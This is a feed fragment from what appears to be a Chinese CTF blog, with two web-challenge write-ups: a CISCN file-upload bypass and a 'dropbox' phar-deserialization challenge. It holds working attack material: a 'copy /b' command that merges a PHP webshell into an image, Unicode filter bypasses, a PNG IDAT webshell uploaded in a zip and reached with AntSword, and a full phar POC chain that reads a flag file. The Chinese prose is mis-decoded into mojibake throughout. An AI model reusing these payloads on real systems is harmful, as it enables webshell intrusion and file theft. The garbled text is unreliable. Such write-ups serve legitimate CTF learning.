    <content type="html"><![CDATA[<h3 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">ğŸ­</a>åˆ†æ</h3><p>é¢˜ç›®ç»™äº†æºç index.phpåšå‡ºäº†å¦‚ä¸‹é™åˆ¶ã€‚è¿™é¢˜è·Ÿä¹‹å‰uploadé¶åœºçš„äºŒæ¬¡æ¸²æŸ“å¾ˆåƒã€‚</p><ul><li>ä¸Šä¼ éœ€è¦ç»•è¿‡<code>getimagesize</code></li><li>å›¾ç‰‡çš„é•¿å®½å¿…é¡»ä¸º1.</li><li>æ–‡ä»¶åä¸èƒ½æœ‰cã€iã€h.è¿™æ ·å¹³å¸¸æ™®é€šçš„ç»•è¿‡æ‰‹æ®µï¼Œ.htaccess çš„hè¢«è¿‡æ»¤ï¼Œ.use.ini çš„iè¢«è¿‡æ»¤ï¼Œå°±ç®—æŠ“åŒ…ä¿®æ”¹ä»–çš„åç¼€ï¼Œä¹Ÿä¼šä¸€èµ·è¢«æ£€æµ‹ã€‚</li></ul><h4 id="getimagesize"><a class="header-anchor" href="#getimagesize">ğŸ­</a>getimagesize()</h4><p>getimagesize() å‡½æ•°ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼Œæ ¹æ®åˆ¤æ–­æ–‡ä»¶ç±»å‹å’Œæ–‡ä»¶å¤§å°ï¼ˆæ„é€ æ–‡ä»¶å¤´ï¼‰æ¥åˆ¤æ–­ä¸Šä¼ æ–‡ç±»å‹ã€‚</p><p>æ€ä¹ˆæ¥ç»•è¿‡å®ƒå‘¢ï¼Ÿgetimagesize è¿™ä¸ªå‡½æ•°æ˜¯æ£€æŸ¥å›¾ç‰‡çš„å‰é¢16è¿›åˆ¶æ¥æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡ã€‚å¦‚æœåœ¨16è¿›åˆ¶åé¢åŠ å…¥æ¶æ„ä»£ç ï¼Œå°±å¯ä»¥ä¸Šä¼ å›¾ç‰‡å’Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆæ”¹URLçš„ï¼‰ç»“åˆ è¾¾åˆ°å…¥ä¾µçš„ç›®çš„ï¼å³åˆ¶ä½œåŒ…å«æ¶æ„ä»£ç çš„å›¾ç‰‡ï¼<br>åˆ¶ä½œæ–¹æ³•ï¼š</p><ul><li><p>ç›´æ¥ä¼ªé€ å¤´éƒ¨GIF89A</p></li><li><p><code>copy /b test.png +muma.php ccc.png </code> //ä¼ªé€ å¤´éƒ¨</p><p>å…¶ä¸­test.pngä¸º åŸå§‹å›¾ç‰‡ ï¼Œæ­¤å‘½ä»¤å°† test.png å’Œmuma.php åˆæˆï¼Œé‡æ–°ç”Ÿæˆccc.png,ç„¶åä¸Šä¼  ccc.png</p></li><li><p>ä½¿ç”¨GIMPé€šè¿‡å¢åŠ å¤‡æ³¨ï¼Œå†™å…¥æ‰§è¡Œå‘½ä»¤</p></li></ul><p>æœ¬é¢˜ç»•è¿‡<code>getimagesize</code>æ¯”è¾ƒç®€å•ä½¿ç”¨XMBå¤´å³å¯ï¼š</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_width 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_height 1</span></code></pre><h4 id="stristrï¼ˆï¼‰"><a class="header-anchor" href="#stristrï¼ˆï¼‰">ğŸ­</a>stristrï¼ˆï¼‰</h4><p>æºç å‡ºç°äº†<code>mb_strtolower</code>ï¼Œå¯ä»¥ä½¿ç”¨<code>Unicode</code></p><p><img src="/2021/07/11/upload-1/1.png" alt="1"></p><p>fuzzå¯ä»¥çŸ¥é“éƒ¨åˆ†å­—æ¯åœ¨ç»è¿‡<code>mb_strtolower</code>å¤„ç†è¿‡å¯ä»¥ç­‰æ•ˆæ™®é€šå­—æ¯çš„ã€‚å¦‚ <code>i</code>å¯ä»¥ç”¨(%C5%BF)ä»£æ›¿ï¼š</p><pre><code class="hljs php">$imagePath = <span class="hljs-string">&quot;image/&quot;</span> . mb_strtolower($fileName);<span class="hljs-comment">//</span>å¯ä»¥åˆ©ç”¨ä¸€äº›unicodeå­—ç¬¦ç»•è¿‡ã€‚ç»è¿‡æµ‹è¯•å‘ç°<span class="hljs-meta">&lt;?php</span>var_dump(mb_strtolower(<span class="hljs-string">&#x27;Ä°&#x27;</span>)===<span class="hljs-string">&#x27;i&#x27;</span>);<span class="hljs-meta">?&gt;</span>ç»“æœä¸º<span class="hljs-literal">true</span>å¹¶ä¸”å‰é¢è¿˜è¿›è¡Œäº†urlè§£å¯†ã€‚æ‰€ä»¥å¯ä»¥ç”¨%c4%b0ä»£æ›¿<span class="hljs-string">&#x27;Ä°&#x27;</span>å­—ç¬¦</code></pre><p>ä½†æ˜¯hæ²¡æœ‰ç›¸å…³å­—æ¯å¯ä»¥ä»£æ›¿ï¼Œæš‚æ—¶è¡Œä¸é€šã€‚</p><p>æ‰«ç›®å½•å‘ç°<code>example.php</code>å†å…·ä½“åˆ†æã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>])) &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>]))    $ctf = $_GET[<span class="hljs-string">&quot;ctf&quot;</span>];<span class="hljs-keyword">if</span>($ctf==<span class="hljs-string">&quot;poc&quot;</span>) &#123;    $zip = <span class="hljs-keyword">new</span> \ZipArchive();    $name_for_zip = <span class="hljs-string">&quot;example/&quot;</span> . $_POST[<span class="hljs-string">&quot;file&quot;</span>];    <span class="hljs-keyword">if</span>(explode(<span class="hljs-string">&quot;.&quot;</span>,$name_for_zip)[count(explode(<span class="hljs-string">&quot;.&quot;</span>,$name_for_zip))<span class="hljs-number">-1</span>]!==<span class="hljs-string">&quot;zip&quot;</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> ($zip-&gt;open($name_for_zip) !== <span class="hljs-literal">TRUE</span>) &#123;        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;éƒ½ä¸èƒ½è§£å‹å‘¢&quot;</span>);    &#125;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ&quot;</span>;    $pos_for_zip = <span class="hljs-string">&quot;/tmp/example/&quot;</span> . md5($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);    $zip-&gt;extractTo($pos_for_zip);    $zip-&gt;close();    unlink($name_for_zip);    $files = glob(<span class="hljs-string">&quot;<span class="hljs-subst">$pos_for_zip</span>/*&quot;</span>);    <span class="hljs-keyword">foreach</span>($files <span class="hljs-keyword">as</span> $file)&#123;        <span class="hljs-keyword">if</span> (is_dir($file)) &#123;            <span class="hljs-keyword">continue</span>;        &#125;        $first = imagecreatefrompng($file);        $size = min(imagesx($first), imagesy($first));        $second = imagecrop($first, [<span class="hljs-string">&#x27;x&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;y&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;width&#x27;</span> =&gt; $size, <span class="hljs-string">&#x27;height&#x27;</span> =&gt; $size]);        <span class="hljs-keyword">if</span> ($second !== <span class="hljs-literal">FALSE</span>) &#123;            $final_name = pathinfo($file)[<span class="hljs-string">&quot;basename&quot;</span>];            imagepng($second, <span class="hljs-string">&#x27;example/&#x27;</span>.$final_name);            imagedestroy($second);        &#125;        imagedestroy($first);        unlink($file);    &#125;&#125;</code></pre><p>å…¶ä¸­</p><p><img src="/2021/07/11/upload-1/1.jpg" alt="1"></p><p>éœ€è¦ä¸Šä¼ <code>zip</code>æ ¼å¼ç„¶åé€šè¿‡è¿™ä¸ªç¨‹åºè§£å‹ï¼Œéœ€è¦ç»•è¿‡<code>imagecreatefrompng</code>,ç”¨è„šæœ¬æ¥ç”Ÿæˆå›¾ç‰‡é©¬ï¼š<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a></p><p>å…ˆä¿®æ”¹è„šæœ¬çš„payloadéƒ¨åˆ†ï¼š</p><p><img src="/2021/07/11/upload-1/2.png" alt="2"></p><p>å¾—åˆ°çš„æ•°æ®è¿›è¡Œä¿®æ”¹</p><p><img src="/2021/07/11/upload-1/3.png" alt="3"></p><p>å¤åˆ¶å‡ºåå…­è¿›åˆ¶ï¼Œåˆ°ç½‘ç«™è½¬æ¢æˆpayload</p><p><img src="/2021/07/11/upload-1/4.png" alt="4"></p><p>ä¿®æ”¹è„šæœ¬</p><p><img src="/2021/07/11/upload-1/5.png" alt="5"></p><p>ç”Ÿæˆå›¾ç‰‡é©¬</p><p><img src="/2021/07/11/upload-1/6.png" alt="6"></p><p>ä¿®æ”¹å›¾ç‰‡åç¼€ä¸ºphpç„¶åå‹ç¼©æˆzipï¼Œä¸Šä¼ æ–‡ä»¶å¹¶æŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åå¹¶æ·»åŠ é•¿åº¦ç»•è¿‡çš„å­—ç¬¦ä¸²</p><p><img src="/2021/07/11/upload-1/7.png" alt="7"></p><p>postä¸Šä¼ çš„ç½‘é¡µæºç ï¼š</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POSTæ•°æ®åŒ…POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://faebbc7b-35b5-4792-8b8a-9af1ec7fc48f.node3.buuoj.cn/upload.php?ctf=upload&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>æ–‡ä»¶åï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;postedFile&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;postedFile&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;æäº¤&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>è§£å‹</p><p><img src="/2021/07/11/upload-1/2.jpg" alt="2"></p><p>è¯•ç€è®¿é—®/example/a.phpæˆåŠŸï¼Œèšå‰‘è¿›è¡Œè¿æ¥ï¼Œåœ¨etcæ‰¾åˆ°ç›®å½•è®¿é—®ã€‚</p><p><img src="/2021/07/11/upload-1/9.png" alt="9"></p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/miuzzx/article/details/116885083">ciscnå›½èµ›åˆèµ›web</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>dropbox</title>
    <link href="/2021/05/18/dropbox/"/>
    <url>/2021/05/18/dropbox/</url>
    
    <content type="html"><![CDATA[<p>è¿™é“é¢˜æ¶‰åŠäº†pharååºåˆ—åŒ–ï¼Œ__callé­”æœ¯æ–¹æ³•ç­‰å¤šä¸ªçŸ¥è¯†ç‚¹ã€‚</p><p>ç™»å½•é¡µé¢åéšæ„ä¸Šä¼ å›¾ç‰‡ï¼Œå‘ç°ä»»æ„ä¸‹è½½</p><img src="/2021/05/18/dropbox/1.jpg" alt="1" style="zoom:67%;"><p>å°†æ–‡ä»¶éƒ½ä¸‹è½½ï¼Œè¿›è¡Œå®¡è®¡</p><p><code>class.php</code>:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$dbaddr = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;$dbuser = <span class="hljs-string">&quot;root&quot;</span>;$dbpass = <span class="hljs-string">&quot;root&quot;</span>;$dbname = <span class="hljs-string">&quot;dropbox&quot;</span>;$db = <span class="hljs-keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;    <span class="hljs-keyword">public</span> $db;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">global</span> $db;        <span class="hljs-keyword">$this</span>-&gt;db = $db;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span>(<span class="hljs-params">$username</span>) </span>&#123;        $stmt = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);        $stmt-&gt;bind_param(<span class="hljs-string">&quot;s&quot;</span>, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count = $stmt-&gt;num_rows;        <span class="hljs-keyword">if</span> ($count === <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span>(<span class="hljs-params">$username, $password</span>) </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;user_exist($username)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        $password = sha1($password . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);        $stmt = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);        $stmt-&gt;bind_param(<span class="hljs-string">&quot;ss&quot;</span>, $username, $password);        $stmt-&gt;execute();        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span>(<span class="hljs-params">$username, $password</span>) </span>&#123;        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;user_exist($username)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        $password = sha1($password . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);        $stmt = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);        $stmt-&gt;bind_param(<span class="hljs-string">&quot;s&quot;</span>, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;db-&gt;close();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;    <span class="hljs-keyword">private</span> $files;    <span class="hljs-keyword">private</span> $results;    <span class="hljs-keyword">private</span> $funcs;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$path</span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();        $filenames = scandir($path);        $key = array_search(<span class="hljs-string">&quot;.&quot;</span>, $filenames);        <span class="hljs-keyword">unset</span>($filenames[$key]);        $key = array_search(<span class="hljs-string">&quot;..&quot;</span>, $filenames);        <span class="hljs-keyword">unset</span>($filenames[$key]);        <span class="hljs-keyword">foreach</span> ($filenames <span class="hljs-keyword">as</span> $filename) &#123;            $file = <span class="hljs-keyword">new</span> File();            $file-&gt;open($path . $filename);            array_push(<span class="hljs-keyword">$this</span>-&gt;files, $file);            <span class="hljs-keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="hljs-keyword">array</span>();        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$func, $args</span>) </span>&#123;        array_push(<span class="hljs-keyword">$this</span>-&gt;funcs, $func);        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;files <span class="hljs-keyword">as</span> $file) &#123;            <span class="hljs-keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        $table = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;        $table .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> $func) &#123;            $table .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities($func) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;        &#125;        $table .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;        $table .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;results <span class="hljs-keyword">as</span> $filename =&gt; $result) &#123;            $table .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;            <span class="hljs-keyword">foreach</span> ($result <span class="hljs-keyword">as</span> $func =&gt; $value) &#123;                $table .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities($value) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;            &#125;            $table .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities($filename) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;</span>;            $table .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;        &#125;        <span class="hljs-keyword">echo</span> $table;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;    <span class="hljs-keyword">public</span> $filename;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params">$filename</span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;filename = $filename;        <span class="hljs-keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">return</span> basename(<span class="hljs-keyword">$this</span>-&gt;filename);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>&#123;        $size = filesize(<span class="hljs-keyword">$this</span>-&gt;filename);        $units = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; TB&#x27;</span>);        <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $size &gt;= <span class="hljs-number">1024</span> &amp;&amp; $i &lt; <span class="hljs-number">4</span>; $i++) $size /= <span class="hljs-number">1024</span>;        <span class="hljs-keyword">return</span> round($size, <span class="hljs-number">2</span>).$units[$i];    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;        unlink(<span class="hljs-keyword">$this</span>-&gt;filename);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><code>class.php</code>ä¸­å®šä¹‰äº†ä¸‰ä¸ªç±»ï¼š<code>Userï¼ŒFilelistï¼ŒFile</code><br>Userç±»ä¸­é™¤äº†ä¸‰ä¸ªç”¨æˆ·å¤„ç†å‡½æ•°å¤–ï¼Œåœ¨ç»“æŸå¯¹è±¡æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œ<code>__destruct</code>å‡½æ•°è°ƒç”¨<code>close()</code></p><p><img src="/2021/05/18/dropbox/2.jpg" alt="2"></p><p>Filelistç±»ä¸­å­˜åœ¨ä¸€ä¸ªç‰¹åˆ«çš„é­”æœ¯æ–¹æ³•ï¼Œ__call()</p><blockquote><p>PHP5 çš„å¯¹è±¡æ–°å¢äº†ä¸€ä¸ªä¸“ç”¨æ–¹æ³• __call()ï¼Œè¿™ä¸ªæ–¹æ³•ç”¨æ¥ç›‘è§†ä¸€ä¸ªå¯¹è±¡ä¸­çš„å…¶å®ƒæ–¹æ³•ã€‚å½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨æˆ–è¢«æƒé™æ§åˆ¶ä¸­çš„æ–¹æ³•ï¼Œ__call æ–¹æ³•å°†ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚è¯¥å‡½æ•°ä¼šæŠŠä¸å¯è°ƒç”¨çš„åä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ–¹æ³•ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥__callæ–¹æ³•ä¸­æ‰§è¡Œ</p></blockquote><p><img src="/2021/05/18/dropbox/3.jpg" alt="3"></p><p>éå†filesæ•°ç»„ï¼Œå¯¹æ¯ä¸€ä¸ªfileå˜é‡æ‰§è¡Œä¸€æ¬¡$funcï¼Œç„¶åå°†ç»“æœå­˜è¿›$resultsæ•°ç»„ã€‚ æœ€åç»“æŸæ—¶è°ƒç”¨_destructæ‰“å°å‡º$resultå’Œ$funcçš„ä¿¡æ¯.</p><p><img src="/2021/05/18/dropbox/4.jpg" alt="4"></p><p>Fileç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå’ŒUserç±»ä¸­çš„åŒåå‡½æ•°close()ï¼Œç›´æ¥è·å–æ–‡ä»¶å†…å®¹</p><p><img src="/2021/05/18/dropbox/5.jpg" alt="5"></p><p>è¿™ä¸ªå‡½æ•°å’ŒUsersä¸­æœ€ådbè°ƒç”¨çš„close()åŒåï¼ŒFileå’ŒFilelistä¸­æ²¡æœ‰dbå˜é‡ï¼Œå› æ­¤å½“dbæ˜¯FileListå¯¹è±¡çš„ä¸€ä¸ªå˜é‡æ—¶ï¼ŒUserå¯¹è±¡å°±ä¼šè°ƒç”¨<code>__destruct</code>ã€‚<br>æ¥ç€destructå‡½æ•°è§¦å‘FileListçš„close()ï¼Œç„¶è€ŒFilelistä¸­æ²¡æœ‰closeæ–¹æ³•ï¼Œå› æ­¤<code>__call()</code>å‡½æ•°è¢«è°ƒç”¨ï¼Œclose()å‡½æ•°è¢«ä¼ å…¥__callæ‰§è¡Œã€‚<br>Filelistå¯¹è±¡é”€æ¯æ—¶ï¼Œæœ€åçš„<code>__destruct</code>å‡½æ•°å°±ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œä»è€Œæ‰“å°å‡º<code>__call</code>ä¸­ä¼ å…¥çš„$resultå’Œ$funcçš„ä¿¡æ¯ï¼Œè¿™å°±å¯ä»¥æ‰“å°å‡ºflagçš„å€¼.</p><p>poc:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;    <span class="hljs-keyword">public</span> $db;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;    <span class="hljs-keyword">public</span> $filename;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;    <span class="hljs-keyword">private</span> $files;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        $file = <span class="hljs-keyword">new</span> File();        $file-&gt;filename = <span class="hljs-string">&quot;/flag.txt&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>($file);    &#125;&#125;$a = <span class="hljs-keyword">new</span> User();$a-&gt;db = <span class="hljs-keyword">new</span> FileList();$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//åç¼€åå¿…é¡»ä¸ºphar</span>$phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//è®¾ç½®stub</span>$o = <span class="hljs-keyword">new</span> User();$o-&gt;db = <span class="hljs-keyword">new</span> FileList();$phar-&gt;setMetadata($a); <span class="hljs-comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span>$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>$phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre><p>å°†ç”Ÿæˆçš„pharæ–‡ä»¶ä¸Šä¼ ,æŠ“åŒ…æ”¹æ–‡ä»¶ç±»å‹ç»•è¿‡æ–‡ä»¶ç±»å‹æ£€æµ‹ï¼Œç„¶ååœ¨delete.phpé‡Œé¢è¯»å–pharå¾—åˆ°flag</p><h4 id="TIP1ï¼šåœ¨delete-phpä¸­åˆ©ç”¨payloadï¼Œè€Œä¸æ˜¯download-php"><a class="header-anchor" 